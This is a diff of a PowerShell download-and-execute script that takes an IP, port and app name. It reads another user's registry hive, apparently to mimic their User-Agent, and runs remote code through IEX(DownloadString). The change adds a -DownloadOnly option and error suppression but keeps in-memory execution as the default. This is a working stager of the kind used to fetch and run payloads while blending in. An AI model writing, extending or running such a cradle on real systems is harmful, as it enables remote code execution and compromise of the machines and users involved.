@@ -2,11 +2,12 @@ param(
     [string]$ip,
     [int]$port,
     [string]$app,
-    [switch]$verbose
+    [switch]$verbose,
+    [switch]$DownloadOnly
 )
 
 # Mount HKU for accessing other user hives
-New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction SilentlyContinue | Out-Null
 
 # Get first real user SID
 $keys = Get-ChildItem 'HKU:\'
@@ -92,12 +93,21 @@ function Get-UserAgent {
 $ua = Get-UserAgent
 $wc.Headers.Add("User-Agent", $ua)
 
-# Download and execute
+# Download or Execute
 try {
     if ($verbose) {
-        Write-Host "Downloading from $url"
+        Write-Host "[*] Downloading from $url"
     }
-    IEX ($wc.DownloadString($url))
+
+    if ($DownloadOnly) {
+        $desktopPath = [Environment]::GetFolderPath("Desktop")
+        $destPath = Join-Path -Path (Get-Location) -ChildPath $app
+        $wc.DownloadFile($url, $destPath)
+        Write-Host "[+] Downloaded to: $destPath"
+        Write-Host "[!] Please review the file before executing manually."
+    } else {
+        IEX ($wc.DownloadString($url))
+    }
 } catch {
     Write-Error "[-] Failed: $_"
 }
